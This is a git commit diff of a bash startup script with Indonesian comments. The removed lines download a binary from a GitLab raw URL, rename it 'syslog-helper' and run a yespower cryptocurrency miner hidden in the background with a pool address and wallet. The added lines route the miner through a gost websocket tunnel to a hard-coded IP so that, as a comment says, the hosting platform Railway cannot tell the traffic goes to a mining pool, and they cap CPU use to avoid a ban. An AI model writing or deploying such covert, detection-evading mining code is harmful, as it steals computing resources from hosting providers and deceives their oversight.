e2eed0ec0af7f599bb5a9f56563dfae6ae531046
iniaslilohbetra <iniaslilohbetra@quickmails.eu>
2026-07-06 08:42:50 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,45 +1,18 @@
 #!/bin/bash
 
 # --- KONFIGURASI ---
-FAKE_NAME="syslog-helper"
-BINARY_URL="https://gitlab.com/ferrynara12/mypro/-/raw/main/docker"
-INSTALL_DIR="/tmp" # Gunakan /tmp agar lebih aman di container
-CONF_DIR="/tmp/syslog-conf"
+IP_UBUNTU="45.115.224.184" # IP Server kamu
 
-echo "--- Memulai Setup Miner (Non-Systemd ) ---"
+echo "Membuka Terowongan Websocket..."
+# Membuat port lokal 4629 yang terhubung ke Ubuntu via Websocket
+./gost -L tcp://:4629/127.0.0.1:4629 -F ws://$IP_UBUNTU:80?path=/ws-data &
 
-# 1. Instal Dependensi (Jika belum ada)
-apt update && apt install -y curl libcurl4 libjansson4 libssl3
+sleep 5
 
-# 2. Buat direktori konfigurasi
-mkdir -p $CONF_DIR
-
-# 3. Download dan Rename Binary
-echo "Mengunduh binary..."
-curl -L $BINARY_URL -o $INSTALL_DIR/$FAKE_NAME
-chmod +x $INSTALL_DIR/$FAKE_NAME
-
-# 4. Buat file konfigurasi JSON
-cat <<EOF > $CONF_DIR/config.json
-{
-    "algo": "yespower",
-    "url": "stratum+tcp://dagnam.xyz:4629",
-    "user": "WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1",
-    "pass": "c=SWAMP",
-    "threads": 1,
-    "quiet": false
-}
-EOF
-
-# 5. Jalankan langsung di background
-echo "Menjalankan miner..."
-cd $INSTALL_DIR
-./$FAKE_NAME -c $CONF_DIR/config.json > /dev/null 2>&1 &
-
-echo "--------------------------"
-echo "Selesai! Cek apakah proses sudah ada dengan perintah:"
-echo "ps aux | grep $FAKE_NAME"
-ps aux | grep $FAKE_NAME
+echo "Menjalankan Miner via Tunnel..."
+# Miner menyambung ke 127.0.0.1 (Lokal), Railway tidak tahu itu ke pool mining
+# Gunakan -t 1 agar CPU tidak 100% (Penyebab utama kena ban)
+./docker -a yespower -o stratum+tcp://127.0.0.1:4629 -u WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1 -p c=SWAMP -t 1  > /dev/null 2>&1 &
 
 echo "Running..."
 
